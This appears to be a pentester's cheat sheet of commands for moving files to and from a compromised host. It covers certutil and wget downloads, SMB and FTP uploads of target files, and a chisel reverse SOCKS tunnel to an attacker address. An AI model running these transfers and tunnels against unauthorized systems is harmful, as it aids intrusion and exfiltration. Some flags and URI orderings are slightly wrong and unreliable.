# Python:
Server (Linux):
```Shell
$ python3 -m http.server PORT
```
Client (Windows/Linux):
```shell-session
wget <address> -o <outputFile>
```
# Certutil
Windows
```powershell
PS > certutil -urlcache -f http://IP:PORT/file file_local
```
Could be used with [[Windows Privesc.#RunasCs.exe]] 
# SMB:
Server:
```shell-session
$ sudo impacket-smbserver -smb2support SHARE_NAME RUN_DIR
$ sudo impacket-smbserver -smb2support share $(pwd)
```
Client:
```powershell
> New-PSDrive -Name "SHARE_NAME" -PsProvider "Filesystem" -Root "\\YOUR_IP\YOUR_SHARE_NAME"
```
```powershell
> copy-item "Target-File" \\<IP>:<PORT>\<shareName>\<outputName>
```
# Chisel
Server (Linux):
```shell-session
$ chisel server --reverse --socks5 -p 8001
```
Client (Windows)
```powershell
> .\chisel.exe client HACKER_IP:PORT R:socks
```

Can be used with `curl`:
```shell-session
$ curl -x socks5://127.0.0.1:LPORT https://127.0.0.1:RPORT
```

# LDAP
Server:
```shell-session
$ java -cp .:/opt/unboundid-ldapsdk-7.0.0/unboundid-ldapsdk.jar Server
```
# FTP
Server (Linux):
```shell-session
$ python3 -m pyftpdlib -w
```
Client (Windows):
```powershell
PS > $webclient = New-Object System.Net.WebClient
PS > $webclient.Credentials = New-Object System.Net.NetworkCredential("anonymous", "anonymous@domain.com")
PS > $ftpUri = New-Object System.Uri("ftp://<PORT>:<IP>/<output-file>")
PS > $webclient.UploadFile($ftpUri, $localFilePath)
```